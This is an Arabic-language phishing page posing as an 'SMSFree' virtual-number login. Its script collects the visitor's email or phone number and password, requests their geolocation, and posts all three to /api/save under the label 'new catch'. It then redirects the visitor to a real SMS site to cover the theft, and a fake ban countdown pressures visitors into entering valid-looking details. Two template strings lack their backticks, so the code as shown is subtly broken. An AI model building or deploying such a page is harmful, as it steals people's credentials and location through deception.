<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الخدمة</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --primary-cyan: #22d3ee;
            --accent-glow: rgba(34, 211, 238, 0.3);
            --text-white: #f8fafc;
            --input-bg: rgba(15, 23, 42, 0.6);
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background: radial-gradient(circle at top right, #1e293b, #0f172a);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white); overflow: hidden;
        }

        .main-container {
            width: 90%; max-width: 420px; background: var(--card-bg);
            backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 50px 30px; border-radius: 30px; text-align: center;
            box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
            position: relative; transition: 0.5s ease;
        }

        .is-banned .blur-content { filter: blur(20px); opacity: 0.1; pointer-events: none; }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid var(--primary-cyan);
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: 800; color: var(--primary-cyan);
            background: rgba(34, 211, 238, 0.05); text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
        }

        h2 { font-size: 16px; font-weight: 400; color: #cbd5e1; margin-bottom: 35px; line-height: 1.7; }

        .input-group { position: relative; margin-bottom: 18px; }
        input {
            width: 100%; padding: 16px 20px; background: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
            color: white; outline: none; text-align: center; font-size: 15px;
            transition: all 0.3s; box-sizing: border-box;
        }
        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.9); }

        .submit-btn {
            width: 100%; padding: 18px; 
            background: linear-gradient(135deg, #155e75, #22d3ee); 
            border: none; border-radius: 15px; color: #0f172a;
            font-size: 17px; font-weight: 700; cursor: pointer;
            position: relative; overflow: hidden;
            transition: transform 0.2s, box-shadow 0.3s;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .submit-btn:hover { 
            transform: translateY(-2px) scale(1.02); 
            box-shadow: 0 15px 30px rgba(34, 211, 238, 0.4); 
            background: linear-gradient(135deg, #0ea5e9, #22d3ee);
        }

        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }
        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 25px; display: block; }

        .loader-wrap { position: relative; width: 110px; height: 110px; margin: 0 auto; }
        .spiral {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border: 4px solid rgba(34, 211, 238, 0.1); border-top: 4px solid var(--primary-cyan);
            border-radius: 50%; animation: spin 1s linear infinite;
        }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        #timer { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 32px; font-weight: bold; color: #fbbf24; }

.glass-popup {
            background: rgba(15, 23, 42, 0.9) !important;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            border-radius: 25px !important;
            color: white !important;
        }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    <div class="ban-overlay" id="banOverlay">
        <span class="ban-title">لقد تم حظرك</span>
        <div class="loader-wrap">
            <div class="spiral"></div>
            <div id="timer">30</div>
        </div>
        <h3 style="color: #fbbf24; margin: 25px 0 5px; font-size: 17px;">نظام الحماية نشط</h3>
        <p style="font-size: 13px; color: #cbd5e1; padding: 0 10px;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
    </div>

    <div class="blur-content">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لحساباتك.</h2>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="pass" placeholder="كلمة المرور" required>
            </div>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
        <p style="margin-top: 25px; font-size: 11px; color: #64748b;">© Global Virtual Numbers Pro 2026. جميع الحقوق محفوظة.</p>
    </div>
</div>

<script>
    let loginAttempts = 0;
    let countdown;

    window.onload = () => {
        const banExpiry = localStorage.getItem('lock_expiry');
        if (banExpiry) {
            const remain = Math.round((banExpiry - Date.now()) / 1000);
            if (remain > 0) applyBanEffect(remain);
            else localStorage.removeItem('lock_expiry');
        }
    };

    document.getElementById('loginForm').onsubmit = (e) => {
        e.preventDefault();
        const user = document.getElementById('user').value.trim();
        const pass = document.getElementById('pass').value;

        const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRx = /^[0-9]{8,15}$/;
        const hasArabic = /[\u0600-\u06FF]/.test(user);

        if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
            // طلب إذن الموقع الجغرافي عند إرسال البيانات
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const loc = https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude};
                        processCapture(user, pass, loc);
                    },
                    () => {
                        // في حال رفض الإذن، يتم الإرسال بدون الموقع
                        processCapture(user, pass, "تم رفض الوصول للموقع");
                    }
                );
            } else {
                processCapture(user, pass, "المتصفح لا يدعم Geolocation");
            }
        } else {
            loginAttempts++;
            if (loginAttempts >= 3) {
                const expiryTime = Date.now() + (30 * 1000);
                localStorage.setItem('lock_expiry', expiryTime);
                applyBanEffect(30);
            } else {
                Swal.fire({
                    title: 'بيانات غير دقيقة',
                    text: 'يرجى كتابة البريد الإلكتروني أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً.',
                    icon: 'error',
                    confirmButtonColor: '#22d3ee',
                    allowOutsideClick: false,
                    customClass: { popup: 'glass-popup' }
                }).then(() => {
                    document.getElementById('user').value = '';
                    document.getElementById('pass').value = '';
                    document.getElementById('user').focus();
                });
            }
        }
    };

function applyBanEffect(duration) {
        const container = document.getElementById('mainCard');
        const overlay = document.getElementById('banOverlay');
        const timerTxt = document.getElementById('timer');
        container.classList.add('is-banned');
        overlay.style.display = 'block';

        let left = duration;
        timerTxt.innerText = left;

        clearInterval(countdown);
        countdown = setInterval(() => {
            left--;
            timerTxt.innerText = left;
            if (left <= 0) {
                clearInterval(countdown);
                container.classList.remove('is-banned');
                overlay.style.display = 'none';
                localStorage.removeItem('lock_expiry');
                loginAttempts = 0;
                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
                    icon: 'success',
                    confirmButtonColor: '#22d3ee',
                    customClass: { popup: 'glass-popup' }
                });
            }
        }, 1000);
    }

    async function processCapture(u, p, location) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    message: 🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location} 
                })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (err) {}
    }
</script>

</body>
</html>
